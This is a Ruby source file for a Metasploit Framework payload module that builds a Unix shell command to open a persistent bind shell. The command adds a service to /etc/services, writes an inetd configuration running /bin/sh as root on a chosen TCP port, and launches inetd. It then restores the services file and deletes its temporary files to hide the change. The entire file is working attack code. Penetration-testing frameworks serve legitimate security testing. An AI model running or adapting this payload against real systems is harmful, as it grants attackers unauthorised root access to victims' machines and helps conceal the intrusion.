require 'msf/core'
require 'msf/core/handler/bind_tcp'
require 'msf/base/sessions/command_shell'

module Msf
module Payloads
module Singles
module Cmd
module Unix

module BindInetd

	include Msf::Payload::Single

	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'Unix Command Shell, Bind TCP (inetd)',
			'Version'       => '$Revision$',
			'Description'   => 'Listen for a connection and spawn a command shell (persistent)',
			'Author'        => 'hdm',
			'License'       => MSF_LICENSE,
			'Platform'      => 'unix',
			'Arch'          => ARCH_CMD,
			'Handler'       => Msf::Handler::BindTcp,
			'Session'       => Msf::Sessions::CommandShell,
			'PayloadType'   => 'cmd',
			'Privileged'    => true,
			'Payload'       =>
				{
					'Offsets' => { },
					'Payload' => ''
				}
			))
	end

	#
	# Constructs the payload
	#
	def generate
		return super + command_string
	end
	
	#
	# Returns the command string to use for execution
	#
	def command_string
		tmp_services = "/tmp/." + Rex::Text.rand_text_alpha(32)
		tmp_inet = "/tmp/." + Rex::Text.rand_text_alpha(32)
		svc = Rex::Text.rand_text_alpha_lower(9)

		cmd =
			# Create a clean copy of the services file
			"cp /etc/services #{tmp_services};" +
			
			# Add our service to the system one
			"echo #{svc} #{datastore['LPORT']}/tcp>>/etc/services;" +
			
			# Create our inetd configuration file with our service
			"echo #{svc} stream tcp nowait root /bin/sh sh>#{tmp_inet};" +
			
			# First we try executing inetd without the full path
			"inetd -s #{tmp_inet} ||" +
			
			# Next try the standard inetd path on Linux, Solaris, BSD
			"/usr/sbin/inetd -s #{tmp_inet} ||" +
			
			# Next try the Irix inetd path
			"/usr/etc/inetd -s #{tmp_inet};" +
			
			# Overwrite services with the "clean" version
			"cp #{tmp_services} /etc/services;" +

			# Delete our configuration file
			"rm #{tmp_inet} #{tmp_services};";

		return cmd
	end

end

end end end end end
